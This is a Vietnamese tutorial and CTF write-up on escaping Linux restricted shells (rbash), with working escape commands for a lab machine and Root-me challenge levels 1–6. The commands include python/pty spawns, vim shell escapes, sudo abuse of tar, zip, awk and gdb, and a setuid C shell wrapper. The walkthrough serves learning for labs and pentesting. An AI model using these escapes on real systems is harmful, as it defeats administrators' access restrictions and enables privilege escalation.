## 0. Mở đầu

Trong quá trình làm các Labs - các Machine về Linux, các cách leo thang đặc quyền "truyền thống" theo ý nghĩa từ User có đặc quyền thấp lên User có đặc quyền cao hơn chiếm đa số. Nhưng song song với đó có những kỹ thuật leo quyền liên quan tới việc hạn chế khả năng thực thi command của người dùng. Đây là việc có xảy ra có real life khi quản trị viên muốn hạn chế quyền hạn, quyền truy cập, khả năng thực thi đối với một đối tượng người dùng nhất định. 


![](https://images.viblo.asia/7e161322-876f-4c15-bf2f-bd815fe082a8.jpg)

Người dùng có thể truy cập thoải mái, nhưng tất cả những gì họ có thể làm đều nằm trong một ranh giới xác định và bị giới hạn, cực kỳ giới hạn!
Đây gọi là **Restricted Shell**.

## 1. Restricted Shell

Nếu bạn đang dùng một OS nào đó thuộc distro Debian, mình tin khả năng cao là bạn đang sử dụng Bash shell.  Và **rbash** cũng là loại Restricted Shell được dùng trong đa số trường hợp các labs/machine. 

![](https://images.viblo.asia/8c837c67-42df-48ca-82f1-95037b26470d.png)

Các  bạn có thể thử ngay những "tính năng ưu việt" được nêu bên dưới bằng command:

```
/bin/bash -r 
hoặc 
/bin/bash --restricted
```

Đối với một số loại shell khác, ví dụ **zsh**, có thể sử dụng Restricted Shell tương tự như trên.

Cái tên nói lên tất cả, "nội tại" của Restricted Shell là khả năng restrict rất mạnh và khắt khe với những "tính năng" như:

1. Không thể dùng **cd** để đổi sang directory khác

      ![](https://images.viblo.asia/c1477078-d2a0-475d-8453-55166c7ca550.png)

2. Không cho phép sửa system environment variables như SHELL, ENV, PATH. (Đọc bài viết [này](https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-2-using-path-variables-3P0lPq6o5ox) của mình để hiểu hơn về environment variables và cách leo quyền qua chúng)

![](https://images.viblo.asia/3313bdc5-2635-4903-8b4e-ab93e86fb3b7.png)


3. Không thể điều hướng output qua các toán tử redirect như: **>**, **>|**, **<>**, **>&**, **&>** và **>>**

![](https://images.viblo.asia/63612add-4ffa-4a91-a007-ae500411029c.png)


4. Không thể thực thi binary khi có chỉ định **/** trong đường dẫn. Bạn chỉ có thể sử dụng trực tiếp những binary trong những thư mục được define tại PATH environment variable của shell. 


![](https://images.viblo.asia/8e1c5c7d-f51f-4c00-bace-dab1bacb557b.png)


5. Bạn không thể thoát khỏi rbash chỉ đơn giản bằng ấn các lệnh exit, out, quit...đơn giản hay dùng Ctrl+C.

Một số nhiều điều khác nữa mà các bạn có thể tham khảo tại docs của GNU tại [đây](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html). 

Mục đích của nó có thể tóm gọn lại như sau:

1. Nâng cao security của hệ thống, kể cả với người dùng được phép truy cập hay với Hacker/Pentester.
2. Người quản trị tự tạo 1 Restricted Shell environment cho mình để tránh việc vô tình thực thi những command dễ gây nguy hiểm
3. Làm đề thi trong thi CTF/Labs/Machine OSCP...
## 2. Bypass Restricted Shell

Thay vì dùng từ Leo thang đặc quyền, mình cảm thấy dùng từ Bypass là phù hợp hơn trong trường hợp này. Đây đơn giản là các bạn thoát ra khỏi tấm hình "song sắt nhà tù"  như ở phần 1 để "tự do" hơn mà thôi. Nhưng theo kinh nghiệm cá nhân, những bài lab/machine sử dụng Restricted Shell thường có cách leo quyền không quá khó, vì nó đã bắt người chơi phải "leo quyền" một lần rồi. Vì vậy nếu có gặp những bài như thế này, có lẽ nên vui hơn là lo lắng.

Bản thân mình đã gặp phải trường hợp này, quả là cái gì khó mà biết thì cũng dễ, cái gì dễ mà không biết thì cũng là khó. Nếu lúc đó trong đầu chỉ cần có khái niệm về **Restricted Shell** thôi thì đã không phải bế tắc, bực mình với machine :v 

Điểm quan trọng và mấu chốt đó là: Người tạo LAB luôn sẽ mở ra một kẽ hở để các bạn bypass. 

Những kẽ hở đó có thể kể đến như:

* Có thể chỉ định **/** để thực thi binary
* Có thể sử dụng, thực thi các command như: cp, more, man, less, vim, rvim, find,...
* Thông qua một số ngôn ngữ lập trình mà rbash có thể sử dụng: ruby, php, python...
* Một số kỹ thuật đặc biệt.

Tất cả chúng đã được document từ 2018 và được đăng tải tại [đây](https://www.exploit-db.com/docs/44592). Hiện tại mình cảm thấy sẽ dư thừa nếu chỉ đơn giản là copy - paste lại chúng. Do đó mình sẽ write-up một số case mình đã làm và gặp. Mình tin cách này các bạn sẽ dễ hiểu concept hơn. Hơn nữa số cách ở ví dụ cũng khá nhiều.


### 2.1 Labs "bên ngoài"

Tại đây, sau khi có được thông tin và SSH vào machine dưới user: alfred, mình đã bị ngồi sau song sắt với tình cảnh như phía trên:

![](https://images.viblo.asia/67f737e1-3087-485e-bafb-92de650120b2.png)


Hướng tiếp cận vẫn như trên, ta cần tìm hiểu xem User có thế thực hiện được những lệnh gì.

Sau đó tìm PATH dẫn tới những binary mà User này có thể sử dụng và liệt kê chúng (User có thể dùng **ls**)

![](https://images.viblo.asia/59eb3fda-c108-4d49-82a1-0f03b542b89e.png)


Thực tế không phải cách leo quyền nào trong [document](https://www.exploit-db.com/docs/44592) được đề cập phía trên cũng sẽ áp dụng được ở mọi machine. Chỉ có một cách là thử từng cái một. Và thành công với Python:

command:

```
alfred@break:~$ python -c 'import os; os.system("/bin/sh")'                   //bypass sang sh shell
$ echo $0
/bin/sh                                                                       //confirmed
$ PATH=/usr/local/bin:/usr/bin:/bin:/usr/games                                //define lại PATH variable

$ $ python -c 'import pty; pty.spawn("/bin/bash")'                            //spawn ra một bash shell
alfred@break:~$ echo $0
/bin/bash                                                                     //done
alfred@break:~$ 
```

![](https://images.viblo.asia/b773e81b-245b-4e34-9066-fa23720a9711.png)



### 2.2 Root-me

Bài được đánh giá là khó, "trùm cuối" của tab  **App - Script** trên Root-me. Và thực sự là nó siêu siêu dài. Mình sẽ viết tới level 6 của lab.

Thử sức ngay tại [đây](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells). Hoặc đơn giản là SSH vào:

```
ssh -p 2222 app-script-ch14@challenge02.root-me.org
Username	app-script-ch14
Password	app-script-ch14
 ```
 
#### Level 1


![](https://images.viblo.asia/bcf7a008-1adc-481e-8c54-38ba20a162ba.png)


Chúng ta không thể dùng **ls**, nhưng có một các khác thay thế:

```
echo ./*
```

![](https://images.viblo.asia/7b6e2324-3c11-4dd5-b137-c5d180de96d2.png)

Như vậy là tại ./step1/ chúng ta có **vim**. Bypass qua vim:

Gõ lần lượt 2 lệnh sau:

```
:set shell=/bin/sh                                              //hoặc /bin/sh
:shell
```


#### Level 2

Tại đây ta sẽ có một sh shell (hoặc bash shell). Sử dụng sudo -l theo như Attention của bài:

![](https://images.viblo.asia/7bc0174f-47c3-4250-8dd7-ff5884c3a1f3.png)

30s quảng cáo: Các bạn có thể đọc bài leo thang đặc quyền qua Sudo Rights của mình tại [đây](https://kgcg.wordpress.com/2020/01/13/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights/).

User **app-script-ch14-2** (có lẽ ngụ ý là level 2) có thể chạy /usr/bin/python với quyền sudo mà không cần nhập password. Dùng python để spawn một bash shell:

```
/usr/bin/sudo -u app-script-ch14-2 /usr/bin/python
```
```
>>> import os
>>> os.system('/bin/bash')
```

![](https://images.viblo.asia/d2338d9f-4a01-4a3c-958d-dfe7c5bc8296.png)



#### Level 3

Tiếp tục sudo -l để kiểm tra, vậy là chúng ta đang đối mặt với level 3: **tar**

![](https://images.viblo.asia/175d5d62-598c-4050-be8a-f8c8cd86bb4d.png)

Ở document mình giới thiệu phía trên đã bao gồm cách bypass với tar. Cùng với đó là một số thông tin mà khi mới SSH vào chúng ta được cho:

![](https://images.viblo.asia/2f53e9be-e2bb-4301-bf6b-2f46ddd9d70c.png)


Tạo một file **shell.c** ở /tmp/ với nội dung như sau:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
int main(int argc, char **argv, char **envp)
{
	setresgid(getegid(), getegid(), getegid());
	setresuid(geteuid(), geteuid(), geteuid());

	execve("/bin/sh", argv,  envp);
	return 0;
}
```

Compile và gán SUID cho nó:

```
gcc shell.c -o testfile && chmod 777 testfile && chmod +s testfile
```

Tại đây mình nhận ra document có bị **thiếu** đôi chút, chỉnh lại như sau để bypass:

```
sudo -u app-script-ch14-3 /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![](https://images.viblo.asia/4fc2efc1-c9c0-428d-94b5-3520d5a09af8.png)



#### Level 4

Cùng xem level 4 có gì:

![](https://images.viblo.asia/06f80abc-8e33-4ace-8750-1da54f53e8a5.png)

Như vậy là **ZIP**. 

Cực kỳ đơn giản, follow theo document và chỉnh sửa ít chỗ là xong:

```
//Tạo file test trước rồi:
sudo -u app-script-ch14-4 /usr/bin/zip test.zip test -T --unzip-command="sh -c /bin/bash"
```

![](https://images.viblo.asia/8a841413-44de-4ffa-9a73-13ccef78255e.png)


#### Level 5:

![](https://images.viblo.asia/caf60db2-0568-44a6-ae9b-ba82ce03daa3.png)

Vậy đây là **awk**, đề theo xu hướng dễ dẫn, follow document và sửa chút xíu là xong :D 

Command:

```
sudo -u app-script-ch14-5 /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

![](https://images.viblo.asia/e05edf2b-45d0-4623-8c88-0495e5350986.png)

#### Level 6: 

Tại đây thì thậm chí chẳng phải modify chút nào luôn!

Command:

```
sudo -u app-script-ch14-6 /usr/bin/gdb
```
Sau đó gõ
```
!/bin/sh hoặc
!/bin/bash
```

![](https://images.viblo.asia/469676e8-f22f-4162-957b-e6112d087023.png)


Theo như tên của bài thì sẽ có tới 14 challenges. Dành phần còn lại cho bạn đọc, hãy thực hành để hiểu hơn !

## 3. Kết luận

Cái gì khó mà biết thì cũng là dễ, cái gì dễ mà không biết thì cũng là khó. 

Như những ví dụ trên, Restricted Shell thực sự không quá khó, hi vọng qua bài viết các bạn đã biết đến thêm một khái niệm mới (hoặc củng cố thêm), hi vọng bài viết có thể giúp ích cho những giờ làm labs giải trí của các bạn !

Happy Hacking!

// Trong bài mình Watermark 1 số ảnh, chủ yếu để tránh một vài bên tự ý clone, thậm chí chỉnh sửa công sức của người khác !

## 4. Tài liệu tham khảo

https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html

https://www.exploit-db.com/docs/44592